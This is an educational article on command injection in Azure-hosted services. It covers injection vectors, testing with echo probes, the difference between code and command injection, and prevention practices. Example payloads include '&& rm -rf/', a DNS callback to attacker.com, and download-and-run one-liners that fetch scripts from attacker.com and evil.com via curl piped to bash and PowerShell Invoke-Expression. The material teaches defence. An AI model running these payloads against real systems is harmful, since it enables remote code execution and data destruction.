# Command Injection in Azure

Command injection is a critical vulnerability that allows an attacker to execute arbitrary system commands on a target machine. In the context of Azure, this can affect services such as Azure Virtual Machines (Windows/Linux), Azure App Services, and containerized applications running in Azure Kubernetes Service (AKS) or Azure Container Instances.

The attack typically occurs when an application running on an Azure resource processes untrusted input without proper sanitization or validation. If the input is directly passed to system-level functions (e.g., exec, system, popen in code or PowerShell/command prompt in scripts), an attacker can inject OS commands to be executed within the application's security context.

## How Command Injection Works in Azure Scenarios?

In Azure, command injection may arise through:

- **Web Apps on Azure VMs or App Services**: Exploiting form fields, HTTP headers, or cookies that are passed to backend shell commands (e.g., invoking cmd.exe or bash).
- **Azure Windows VMs**: Using misconfigured scripts (e.g., PowerShell or CMD) that accept user input and execute it without validation.
- **Azure Linux VMs**: Abusing shell scripts or cron jobs triggered with user-controllable parameters.
- **Azure Functions**: Exploiting user input passed into subprocess calls or automation scripts.
- **Insecure DevOps Pipelines**: Injecting commands into Azure DevOps pipeline variables or deployment scripts.

------------------------------------------------------------------------

## Examples of Command Injection Vectors in Azure

- Passing user input directly to shell commands in a web API hosted on an Azure VM:
- os.system(f"ping {user_input}") \# vulnerable to injection: && rm -rf/
- Exploiting Azure Run Command on a VM to execute attacker-controlled commands if access tokens or roles are compromised.
- Uploading a malicious file that is later executed by a server-side script on an Azure App Service.

------------------------------------------------------------------------

## Expanded Attack Surface

Command injection in Azure can extend to:

- **Privilege Escalation**: Abusing injected commands to elevate privileges on a VM.
- **Lateral Movement**: Using tools like net, winrm, or SSH from within a compromised VM to access other Azure resources.
- **Persistence**: Injecting scheduled tasks, startup scripts, or modifying cloud-init or custom script extensions.
- **Data Exfiltration**: Using curl, wget, or PowerShell to send stolen data to attacker-controlled servers.

------------------------------------------------------------------------

## How to Test for Command Injection in Azure?

Command injection testing involves submitting input designed to break out of expected parameters and execute arbitrary operating system commands. In Azure, this testing is particularly relevant for applications hosted on **Azure VMs (Windows/Linux)**, **App Services**, **Azure Functions**, and **containerized environments (e.g., AKS)** where backend scripts or services may execute shell commands based on user input.

------------------------------------------------------------------------

## Example Scenario: Azure Web App or VM-Hosted Service

Consider an application hosted on an **Azure Linux VM** or **App Service** that queries product stock via a URL like:

https://azureshop.cloudapp.net/stockStatus?productID=381&storeID=29

The backend calls a shell command to retrieve the data (e.g., from a legacy system):

`stockreport.sh 381 29`

However, if the application does not properly sanitize input, an attacker can manipulate the productID parameter to inject additional commands:

`productID=381&storeID=29 → productID=& echo azurepwned &`

Which results in the following command being executed on the server:

`stockreport.sh & echo azurepwned & 29`

------------------------------------------------------------------------

## What Happens?

1. **stockreport.sh** is run without its expected arguments, likely causing an error.
2. **echo azurepwned** is executed, printing a test string in the response — this confirms injection.
3. **29** is interpreted as an additional standalone command, which triggers an error like command not found.

The response might look like:
Error - productID was not provided
azurepwned
29: command not found

------------------------------------------------------------------------

### Key Testing Techniques in Azure Context

- **Command Separators** (&, ;, \|, \|\|) are used to separate injected commands from the rest of the shell line to improve execution reliability.
- **Echo Strings**: Injecting echo commands helps identify injection points by including recognizable output (e.g., echo AZURETEST).
- **Out-of-Band Testing**: Use DNS callbacks (e.g., via nslookup attacker.com) in Azure Functions or VMs to detect blind command injection.
- **Windows-Specific Commands**: On Azure Windows VMs or services, inject commands like echo AzureWinPwn or whoami.

------------------------------------------------------------------------

### Azure-Specific Injection Vectors

- **Azure Run Command**: If compromised, can be used to execute arbitrary shell or PowerShell code remotely on VMs.
- **Custom Script Extension (CSE)**: May be vulnerable if passed unsanitized user input during provisioning or configuration.
- **Azure DevOps Pipelines**: Variables or parameters injected into scripts can be exploited during build or deployment stages.
- **Azure Functions**: Misconfigured functions using subprocess, child_process, or PowerShell execution may be vulnerable.

------------------------------------------------------------------------

## Code Injection vs. Command Injection in Azure

### Code Injection (Azure Context)

Code injection refers to attacks where an attacker introduces untrusted code into an application, which is then interpreted or executed by the application's runtime environment. In Azure, this may affect:

- **Web applications running on Azure App Services** (e.g., injecting PHP, Python, or JavaScript).
- **Custom APIs or Functions** written in dynamic languages that parse or execute user input.
- **Azure Logic Apps** or **Power Automate flows** if custom expressions or scripts are manipulated.

**Key traits:**

- The injected code is executed **within the context of the application**, limited by the language runtime (e.g., Python, PHP, JavaScript) and its permissions.
- The impact is typically constrained to what the application can do e.g., read from a database, modify session data, or access environment variables.
- **Example:** Injecting Python code into an Azure Function that uses eval() on user input.

### Command Injection (Azure Context)

Command injection occurs when user-supplied input is improperly passed to a **system-level command interpreter** (e.g., cmd.exe or bash) on an **Azure VM**, **App Service**, or **Function backend**.

**Key traits:**

- The attacker can inject commands into the shell or system environment, not just the application code.
- These commands are executed with the **privileges of the underlying OS user** running the vulnerable process — potentially giving access to OS-level features, networking, or other Azure services.
- This often leads to **greater control**, such as lateral movement across Azure VMs, data exfiltration, or persistence via startup scripts or extensions.

**Example (Linux VM):**

user input → & curl http://attacker.com/shell.sh \| bash &

**Example (Windows VM):**

user input → & powershell -Command "Invoke-WebRequest -Uri
http://evil.com/payload.ps1 \| Invoke-Expression"

**Key Differences in Azure Context**

| **Feature** | **Code Injection** | **Command Injection** |
|----|----|----|
| **Scope of Execution** | Within app/runtime (e.g., PHP, Python) | On the host OS shell (cmd/bash/PowerShell) |
| **Execution Context** | App-level (limited by runtime and app privileges) | OS-level (VM or service identity privileges) |
| **Azure Attack Surface** | App Services, Azure Functions, Logic Apps | Azure VMs, App Services with shell access, Extensions |
| **Privilege Risk** | Limited to app sandbox | Potential full OS access, lateral movement |
| **Tools Involved** | eval(), include(), exec() in app code | system(), popen(), shell execution, Run Command |

------------------------------------------------------------------------

## Preventing Command Injection in Azure

Command injection can lead to full compromise of Azure-hosted systems such as **Windows/Linux VMs**, **App Services**, **Azure Functions**, or **automation scripts** running via **Run Command**, **Custom Script
Extensions**, or **DevOps pipelines**. Preventing these attacks requires a combination of secure coding practices and platform-aware restrictions.

### Best Practices to Prevent Command Injection in Azure

#### 🔒 Avoid Shell Calls with User Input

- The most effective prevention is to **avoid invoking shell commands from application code**—especially when the input is user-controlled.
- In Azure, many operations can be achieved using **native APIs**, **Azure SDKs**, or **PowerShell/Az CLI modules** rather than raw OS-level calls.

**Example:**

- Instead of using os.system("az vm start ...") in a Function App, use the Azure SDK or REST API directly.

#### *✅ Use Safe, Platform-Native Alternatives

- Use platform features like:
  - **Azure SDKs (Python, .NET, Node.js)** for resource management.
  - **Azure Logic Apps / Durable Functions** for orchestrations.
  - **PowerShell cmdlets** with strict parameter bindings for scripts in Windows VMs.
  - **Bash/Python scripts** with hard-coded or validated values in Linux VMs.

------------------------------------------------------------------------

### When OS Commands Are Unavoidable

If shell command execution cannot be avoided (e.g., legacy scripts in Azure VMs or automation via Custom Script Extension), apply the following defenses:

#### ✅ Strong Input Validation

- **Whitelist values**: Only allow explicitly known, valid inputs. Example: Only accept "storeID=101" if 101 is a known, valid store.
- **Type validation**: Ensure inputs are of expected types (e.g., integers).
- **Character restrictions**: Reject input containing anything other than alphanumeric characters—**disallow all shell metacharacters** like &, ;, \|, \>, \$, etc.

### 🚫 Avoid Escaping Shell Characters

- Do **not** rely on escaping characters to sanitize input. Escaping is error-prone and can often be bypassed by advanced attackers using encodings, nested commands, or shell quirks.
- Example of a bad practice:
- os.system("ping " + user_input.replace("&", "")) \# Still vulnerable

## Azure-Specific Defensive Measures

| **Azure Component** | **Defense Recommendation** |
| ---- | ---- |
| **Azure VMs** | Avoid Invoke-Expression / bash -c with input. Use parameterized scripts. |
| **App Services** | Sanitize all form/query inputs. Use SDKs, not shell commands. |
| **Azure Functions** | Avoid subprocess or child_process for input execution. Use bindings or queues. |
| **Azure Automation / Runbooks** | Use strict parameter types and predefined runbook inputs. |
| **Azure DevOps Pipelines** | Lock down pipeline variables, use templates with strict inputs, avoid shell interpolation. |
